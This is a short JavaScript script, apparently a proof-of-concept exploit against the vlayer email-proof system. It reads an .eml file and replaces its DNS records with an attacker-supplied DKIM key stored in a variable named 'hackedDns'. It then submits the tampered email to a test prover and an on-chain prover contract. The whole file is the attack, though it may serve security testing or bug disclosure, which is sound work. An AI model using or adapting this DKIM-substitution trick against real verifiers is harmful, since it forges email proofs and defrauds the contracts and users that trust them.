import fs from "fs";
import { preverifyEmail, createVlayerClient } from "@vlayer/sdk";
import emailProverAbi from "./emailProver.abi.json" assert { type: "json" };

// Read the email MIME-encoded file content
const email = fs.readFileSync("mail.eml").toString();

// Prepare the email for verification
const unverifiedEmail = await preverifyEmail(email);
const hackedDns = 'v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPwsG12awgnJc3oDr984Y5bVhgJ+EPiGlPqGD+IwD/iVz80hI9o3AVfEjmUgHxCToZsuRxs6dez3TDD1wYRiWcNlmgcEy68IxuAf4nAGxmAueSKRYoencKlH5Bn5XDnQDlnZbr7WWsKlBoDfb2lhK+WSxmDm4oo7Zh+qxzh45elwIDAQAB; n=1024,1450901090,1466712290'
unverifiedEmail.dnsRecords = [hackedDns]

// Create vlayer server client
const vlayer = createVlayerClient({url:"https://test-prover.vlayer.xyz"});

const hash = await vlayer.prove({
  address: "0xab7087b2d91341E7540CCCC04B6EFD83C86188d1", // Address as string
  proverAbi: emailProverAbi.abi,
  functionName: "main",
  args: [unverifiedEmail],
  chainId: 84532,
});

const result = await vlayer.waitForProvingResult(hash);
console.log(result);